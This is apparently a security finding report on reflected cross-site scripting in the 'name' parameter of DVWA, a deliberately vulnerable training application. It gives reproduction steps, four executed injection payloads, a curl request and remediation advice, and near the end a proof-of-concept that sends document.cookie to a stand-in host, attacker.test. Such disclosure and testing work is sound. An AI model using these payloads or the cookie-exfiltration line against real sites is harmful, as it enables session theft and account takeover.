# Reflected XSS in DVWA XSS (Reflected) via GET parameter "name" enables arbitrary JavaScript execution

**ID:** vuln-0003
**Severity:** HIGH
**Found:** 2025-10-22 16:39:59 UTC

## Description

Summary
Reflected Cross-Site Scripting (XSS) exists in the DVWA module “XSS (Reflected)” at /DVWA/vulnerabilities/xss_r/ affecting the GET parameter name. Untrusted user input is reflected into the HTML response without context-appropriate output encoding, allowing direct JavaScript execution. Multiple payload classes executed successfully and were verified via DOM artifacts. Cookies were readable from JavaScript in the tested context, enabling session theft. The response lacks Content Security Policy and explicitly disables legacy XSS protections.

Affected Endpoint
- URL: http://192.168.13.214/DVWA/vulnerabilities/xss_r/
- Method: GET
- Vulnerable parameter: name
- Authentication: Required (tested with DVWA admin/password)
- DVWA Security Level: low

Reproduction Steps (UI)
1) Log in:
   - Browse to /DVWA/login.php, authenticate as admin/password.
2) Set DVWA security to Low:
   - Navigate to /DVWA/security.php, choose “Low”, submit.
3) Navigate to XSS (Reflected):
   - /DVWA/vulnerabilities/xss_r/
4) Submit the following payload in the “What’s your name?” input and press Submit:
   - Example payload (p3):
     <svg xmlns="http://www.w3.org/2000/svg" onload="document.documentElement.setAttribute('xss_valid','p3')"></svg>
5) Verify execution by running in console:
   document.documentElement.getAttribute('xss_valid')  → returns "p3"

Reproduction (cURL)
Note: Requires authenticated session cookie.
curl "http://192.168.13.214/DVWA/vulnerabilities/xss_r/?name=%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22document.documentElement.setAttribute('xss_valid','p3')%22%3E%3C%2Fsvg%3E" \
  -H "Cookie: PHPSESSID=REDACTED; security=low"

Verified Payload Matrix (executed client-side)
- p1 (script tag, HTML context)
  Payload: <script>document.documentElement.setAttribute('xss_valid','p1')</script>
  Result: document.documentElement.getAttribute('xss_valid') = "p1"
  Evidence: Request ID 3746 (proxy)
- p2 (attribute/event handler)
  Payload: <img src=x onerror="document.documentElement.setAttribute('xss_valid','p2')">
  Result: document.documentElement.getAttribute('xss_valid') = "p2"
  Evidence: Request ID 3749 (proxy)
- p3 (SVG onload)
  Payload: <svg xmlns="http://www.w3.org/2000/svg" onload="document.documentElement.setAttribute('xss_valid','p3')"></svg>
  Result: document.documentElement.getAttribute('xss_valid') = "p3"
  Evidence: Request ID 3755 (proxy); response body shows injected SVG inside the page
- p4 (autofocus + onfocus)
  Payload: <textarea autofocus onfocus="document.documentElement.setAttribute('xss_valid','p4')"></textarea>
  Result: document.documentElement.getAttribute('xss_valid') = "p4"

Key Evidence (Proxy/Headers/Body)
- Response headers for XSS page (Request ID 3755):
  HTTP/1.1 200 OK
  X-XSS-Protection: 0
  Content-Type: text/html;charset=utf-8
  (No Content-Security-Policy header present)
- Response body snippet confirming reflection and execution context (ID 3755):
  ... <pre>Hello <svg xmlns="http://www.w3.org/2000/svg" onload="document.documentElement.setAttribute('xss_valid','p3')"></svg></pre> ...
- Request details (ID 3755):
  GET /DVWA/vulnerabilities/xss_r/?name=%3Csvg...onload%3D%22document.documentElement.setAttribute('xss_valid'%2C' p3')%22%3E%3C%2Fsvg%3E
  Cookie: PHPSESSID=REDACTED; security=low
- Cookie access feasibility (observed in-page):
  document.cookie returned: "PHPSESSID=REDACTED; security=low"
  This indicates that, in the tested context, session identifiers were accessible from JavaScript (risk: theft). Ensure HttpOnly is set and enforced for session cookies on all responses.

Impact
- Account takeover via session theft (readable session cookies in-page during an XSS exploit).
- Theft of CSRF tokens and sensitive DOM data.
- Arbitrary actions on behalf of the victim (privileged user/admin) when they visit a crafted link (UI:R).
- Phishing/defacement within application context.
- Potential pivot to perform stored attacks or exfiltrate sensitive information.

CVSS v3.1
- Vector: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
- Base Score: 6.1 (Medium)
Contextual Severity: High for this application due to ease of exploitation, lack of CSP, and feasibility of session/CSRF token exfiltration, leading to practical account takeover.

Root Cause
- Directly reflecting untrusted name parameter into HTML without context-appropriate encoding or sanitization. The reflected sink appears inside HTML (e.g., within a <pre> block), enabling tag injection and event-handler execution.

Remediation
- Apply strict contextual output encoding/escaping on all untrusted output:
  - For PHP, use htmlspecialchars($input, ENT_QUOTES, 'UTF-8') before rendering inside HTML context.
  - For attribute, JavaScript, CSS, or URL contexts, apply appropriate encoders or avoid placing untrusted data in dangerous contexts.
- Validate inputs with allowlists for expected characters/format; reject or sanitize HTML tags and event handlers.
- Implement a robust Content Security Policy (CSP), e.g.:
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'self'
  Prefer nonces or hashes for any inline scripts; remove inline event handlers.
- Set secure cookie attributes to prevent theft and cross-site leakage:
  - HttpOnly; Secure; SameSite=Strict (or Lax depending on flows)
  - Ensure the session cookie is consistently set with HttpOnly and not readable via document.cookie in any response.
- Avoid rendering untrusted data as raw HTML. Use safe templating engines and disable or sanitize dangerous constructs.
- Consider integrating server-side HTML sanitization libraries (when HTML input is required).
- Add security headers:
  - X-Content-Type-Options: nosniff
  - Referrer-Policy: strict-origin-when-cross-origin
  - Permissions-Policy as appropriate

Proof-of-Concept (cookie exfil payload example)
- For demonstration in a test environment only:
  <img src=x onerror="new Image().src='http://attacker.test/steal?c='+encodeURIComponent(document.cookie)">
This shows practical risk of session theft if cookies are readable from JS.

References
- OWASP XSS Cheat Sheet: https://owasp.org/www-community/attacks/xss/
- OWASP XSS Filter Evasion Cheat Sheet: https://owasp.org/www-community/xss-filter-evasion-cheatsheet

Appendix – Proxy Evidence Index
- Req ID 3746: p1 script tag – successful execution (artifact 'p1')
- Req ID 3749: p2 img onerror – successful execution (artifact 'p2')
- Req ID 3755: p3 svg onload – successful execution; header shows X-XSS-Protection: 0; no CSP; body reflects payload as HTML
- Additional: p4 textarea autofocus onfocus – successful execution (artifact 'p4')

Conclusion
The name parameter in DVWA’s “XSS (Reflected)” module is vulnerable to reflected XSS. Multiple payload types execute reliably due to lack of output encoding and absence of CSP. If a privileged user visits a malicious link, an attacker can run arbitrary JavaScript, exfiltrate session/CSRF data, and act on the victim’s behalf. Implement the recommended mitigations immediately.
